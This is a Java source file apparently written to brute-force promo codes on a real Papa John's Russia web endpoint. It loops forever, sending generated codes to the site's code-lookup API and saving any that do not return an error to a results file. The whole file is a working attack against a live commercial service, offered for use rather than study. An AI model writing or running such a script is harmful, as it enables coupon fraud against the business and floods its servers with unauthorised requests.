package com.company;


import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;
import java.io.FileWriter;
import java.io.IOException;


public class Main {

    public static void main(String[] args) throws ParseException, IOException {


        getAnswer answer = new getAnswer();
        JSONParser parser = new JSONParser();
        FileWriter file = new FileWriter("results172.txt", true);
        //int i=10;
        while(true) { //kill it with fire
            String tryed = Brutforce.brut();
            try {
                // System.out.println(answer.getHTML("https://www.papajohns.ru/stock/stock/getbycode/{PROMO}", tryed));
                Object object = parser.parse(answer.getHTML("https://www.papajohns.ru/stock/stock/getbycode/{PROMO}", tryed));

                JSONObject jsonObject = (JSONObject) object;
                System.out.println(((JSONObject) object).get("error"));
                //file.write((String) ((JSONObject) object).get("error") + "\n");
                //i--;

            } catch (Throwable e) {
                System.out.println(tryed);
                file.write(tryed + "\n");
                file.flush();
            }

        }
       // System.out.println(answer.getHTML("https://www.papajohns.ru/stock/stock/getbycode/123"));
       // System.out.println(Brutforce.brut());
        }
    }

